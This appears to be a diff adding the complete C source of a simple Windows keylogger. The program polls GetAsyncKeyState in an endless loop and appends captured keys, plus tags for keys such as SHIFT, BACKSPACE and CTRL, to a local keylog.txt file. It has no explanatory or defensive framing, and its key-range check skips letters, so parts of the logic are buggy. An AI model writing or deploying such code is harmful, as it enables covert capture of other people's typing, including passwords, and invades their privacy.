@@ -1,0 +1,71 @@
+#include <stdio.h>
+#include <windows.h>
+
+void log_keystroke(int key, FILE *logfile) 
+{
+      if ((key >= 39) && (key <= 64))
+	    {
+        	fputc(key, logfile);
+    	}
+	else
+	{
+        	switch (key)
+		{
+            		case VK_SPACE:
+                	fputc(' ', logfile);
+                	break;
+
+            		case VK_SHIFT:
+                	fputs("[SHIFT]", logfile);
+                	break;
+            
+			case VK_RETURN:
+                	fputs("\n", logfile);
+                	break;
+            
+			case VK_BACK:
+                	fputs("[BACKSPACE]", logfile);
+                	break;
+            
+			case VK_TAB:
+                	fputs("[TAB]", logfile);
+                	break;
+            
+			case VK_ESCAPE:
+                	fputs("[ESCAPE]", logfile);
+                	break;
+            
+			case VK_CONTROL:
+                	fputs("[CTRL]", logfile);
+                	break;
+            		
+			default:
+                	break;
+        	}
+    	}
+    	fflush(logfile);
+}
+
+int main() 
+{
+    	FILE *logfile;
+    	logfile = fopen("keylog.txt", "a");
+    	if (logfile == NULL) 
+	{
+        	printf("Error opening file!\n");
+        	return 1;
+    	}
+    	while (1) 
+	{
+        	for (int key = 8; key <= 190; key++) 
+		{
+            		if (GetAsyncKeyState(key) == -32767) 
+			{
+                		log_keystroke(key, logfile);
+            		}
+        	}
+        	Sleep(10);    
+	}
+    	fclose(logfile);
+    	return 0;
+}
